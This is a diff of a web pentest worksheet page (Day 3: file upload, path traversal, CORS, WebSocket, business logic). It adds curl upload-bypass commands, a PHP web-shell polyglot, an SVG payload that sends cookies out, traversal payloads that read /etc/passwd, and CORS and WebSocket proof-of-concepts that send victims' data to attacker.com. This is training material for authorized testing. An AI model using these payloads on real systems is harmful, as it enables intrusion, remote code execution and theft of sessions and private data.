@@ -11,7 +11,7 @@
   <link rel="stylesheet" href="../vulns/style.css">
   <title>Day 3 Worksheet · File Handling + Client-Side · Web Pentest Playbook</title>
 </head>
-<body data-day="day3" style="--day-color: var(--purple)">
+<body data-day="day3" data-day-num="3" style="--day-color: var(--purple)">
 
 <svg class="icon-sprite" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
   <defs>
@@ -44,7 +44,7 @@
 <div class="content-wrap" style="padding-top:2rem">
 
   <div class="day-page-hero">
-    <div class="day-num">Worksheet · Day 3 of 5</div>
+    <div class="day-num">Worksheet · Day 3 of 5 · <span data-day-date class="day-date-display unset">— pick start date below ↓</span></div>
     <h1>
       <span class="day-icon-pill"><svg class="icon" aria-hidden="true"><use href="#icon-folder"/></svg></span>
       File Handling + Client-Side Checks
@@ -63,11 +63,54 @@
       <label for="t-from-day2">Carry-overs from Day 2</label>
       <textarea id="t-from-day2" data-key="text-from-day2" placeholder="What's still open from yesterday — auth bypasses to retest, role-escalation paths to map, etc."></textarea>
     </div>
+    <div class="form-group">
+      <label for="t-startdate">Engagement start date · Day 1</label>
+      <input type="date" id="t-startdate" data-key="shared.startDate">
+      <p class="form-hint">Sets the calendar date for all 5 worksheet pages. Editable from any day.</p>
+    </div>
   </section>
 
   <section class="worksheet-section" id="upload">
     <h2><span class="ws-section-num">2</span>File Upload</h2>
     <p class="ws-intro">For every upload endpoint: identify all client-side and server-side checks, then bypass each one in turn.</p>
+    <pre class="snippet"><span class="snippet-label">Upload bypass test battery (curl)</span><code>TARGET=https://example.com/api/upload
+COOKIE="session=..."
+
+# 1. Plain .php (baseline / often blocked)
+curl -X POST $TARGET -b "$COOKIE" -F "file=@shell.php"
+
+# 2. Double-extension
+curl -X POST $TARGET -b "$COOKIE" -F "file=@shell.php.jpg;type=image/jpeg"
+
+# 3. Uncommon extension
+curl -X POST $TARGET -b "$COOKIE" -F "file=@shell.phtml;type=image/jpeg"
+
+# 4. MIME spoof — keep payload, lie about type
+curl -X POST $TARGET -b "$COOKIE" -F "file=@shell.php;type=image/jpeg"
+
+# 5. Magic-byte spoof (prepend GIF header)
+printf 'GIF89a;
+' &gt; gifphp.gif.php
+cat shell.php &gt;&gt; gifphp.gif.php
+curl -X POST $TARGET -b "$COOKIE" -F "file=@gifphp.gif.php"
+
+# 6. Filename traversal
+curl -X POST $TARGET -b "$COOKIE" -F "file=@shell.php;filename=../shell.php"</code></pre>
+
+    <pre class="snippet"><span class="snippet-label">SVG with embedded XSS (stored if rendered inline)</span><code>cat &amp;gt; xss.svg &amp;lt;&amp;lt;'EOF'
+&amp;lt;?xml version="1.0" standalone="no"?&amp;gt;
+&amp;lt;svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://collab/?'+document.cookie)"&amp;gt;
+  &amp;lt;text x="10" y="20"&amp;gt;hi&amp;lt;/text&amp;gt;
+&amp;lt;/svg&amp;gt;
+EOF
+curl -X POST $TARGET -F "file=@xss.svg;type=image/svg+xml"</code></pre>
+
+    <pre class="snippet"><span class="snippet-label">PHP+JPEG polyglot via exiftool</span><code>cp clean.jpg poly.jpg
+exiftool -Comment='&amp;lt;?php system($_GET["c"]); ?&amp;gt;' poly.jpg
+mv poly.jpg poly.php.jpg
+curl -X POST $TARGET -F "file=@poly.php.jpg"
+# Then visit: https://example.com/uploads/poly.php.jpg?c=id</code></pre>
+
     <div class="form-group">
       <label for="t-upload-endpoints">Upload endpoints in scope</label>
       <textarea id="t-upload-endpoints" data-key="text-upload-endpoints" placeholder="POST /api/avatar — multipart, profile pic&#10;POST /import — CSV import&#10;POST /tickets/{id}/attachment — issue tracker"></textarea>
@@ -89,6 +132,19 @@
 
   <section class="worksheet-section" id="path">
     <h2><span class="ws-section-num">3</span>Path Traversal</h2>
+    <pre class="snippet"><span class="snippet-label">Path traversal payload list</span><code>../../../etc/passwd
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+/etc/passwd
+file:///etc/passwd
+\..\..\..\windows\win.ini
+../../etc/passwd%00.png       # null-byte truncation
+../../etc/passwd%00            # bare null byte
+....\....\....\windows\win.ini</code></pre>
+
     <ul class="task-list">
       <li><input type="checkbox" data-key="check-path-list"><span class="task-label">List every path-typed parameter (<code>?file=</code>, <code>?page=</code>, <code>?include=</code>, <code>?template=</code>)</span></li>
       <li><input type="checkbox" data-key="check-path-basic"><span class="task-label">Basic: <code>../../../etc/passwd</code>, <code>..\..\..\windows\win.ini</code></span></li>
@@ -104,6 +160,26 @@
 
   <section class="worksheet-section" id="cors">
     <h2><span class="ws-section-num">4</span>CORS</h2>
+    <pre class="snippet"><span class="snippet-label">CORS reflection probe</span><code>API=https://example.com/api/me
+COOKIE="session=..."
+for origin in \
+    "https://attacker.com" \
+    "null" \
+    "https://example.com.attacker.com" \
+    "https://eviltarget.com" \
+    "http://example.com" ; do
+  echo "=== Origin: $origin ==="
+  curl -sk -o /dev/null -D - $API -b "$COOKIE" \
+    -H "Origin: $origin" \
+    | grep -iE "access-control"
+done</code></pre>
+
+    <pre class="snippet"><span class="snippet-label">PoC HTML for confirmed CORS leak</span><code>&amp;lt;script&amp;gt;
+fetch("https://example.com/api/me", {credentials:"include"})
+  .then(r =&amp;gt; r.text())
+  .then(t =&amp;gt; fetch("https://attacker.com/log?d=" + btoa(t)));
+&amp;lt;/script&amp;gt;</code></pre>
+
     <ul class="task-list">
       <li><input type="checkbox" data-key="check-cors-list-apis"><span class="task-label">List every API endpoint that returns user data (these are the targets)</span></li>
       <li><input type="checkbox" data-key="check-cors-reflect"><span class="task-label">Test for full reflection: <code>Origin: https://evil.com</code> → <code>Access-Control-Allow-Origin: https://evil.com</code></span></li>
@@ -118,6 +194,16 @@
 
   <section class="worksheet-section" id="websocket">
     <h2><span class="ws-section-num">5</span>WebSocket</h2>
+    <pre class="snippet"><span class="snippet-label">CSWSH proof-of-concept (hosted on attacker page)</span><code>&amp;lt;!-- Hosted on https://attacker.com/cswsh.html --&amp;gt;
+&amp;lt;script&amp;gt;
+const ws = new WebSocket("wss://example.com/chat");
+ws.onmessage = e =&amp;gt; fetch("https://attacker.com/log?d=" + btoa(e.data));
+ws.onopen = () =&amp;gt; ws.send(JSON.stringify({action:"getHistory"}));
+&amp;lt;/script&amp;gt;
+&amp;lt;!-- Send the victim to this page while they hold a session
+     cookie for example.com — if Origin isn't validated, you read
+     their messages. --&amp;gt;</code></pre>
+
     <ul class="task-list">
       <li><input type="checkbox" data-key="check-ws-find"><span class="task-label">Identify all WebSocket endpoints (Burp WebSockets history tab)</span></li>
       <li><input type="checkbox" data-key="check-ws-origin"><span class="task-label">Origin validation on the upgrade — drop / change <code>Origin</code> header in Repeater</span></li>
@@ -130,6 +216,20 @@
   <section class="worksheet-section" id="biz">
     <h2><span class="ws-section-num">6</span>Business Logic</h2>
     <p class="ws-intro">High-impact bugs that don't fit any vuln class — pure logic abuse.</p>
+    <pre class="snippet"><span class="snippet-label">Race-condition probe (Burp Repeater "send group in parallel" or Turbo Intruder)</span><code># Burp Pro: arrange request in Repeater tab, "Send group in parallel".
+# Free alternative — sniped Python with httpx:
+import asyncio, httpx
+URL  = "https://example.com/api/redeem"
+TKN  = "Bearer ..."
+DATA = {"code": "SAVE10"}
+async def fire(c, i):
+    r = await c.post(URL, json=DATA, headers={"Authorization": TKN})
+    print(i, r.status_code, r.json())
+async def main():
+    async with httpx.AsyncClient(http2=True) as c:
+        await asyncio.gather(*(fire(c, i) for i in range(40)))
+asyncio.run(main())</code></pre>
+
     <ul class="task-list">
       <li><input type="checkbox" data-key="check-biz-coupon"><span class="task-label">Coupon / discount code: reuse, stacking, application after total calc, negative values</span></li>
       <li><input type="checkbox" data-key="check-biz-quantity"><span class="task-label">Negative quantity (refund-as-purchase), zero quantity, fractional quantity</span></li>
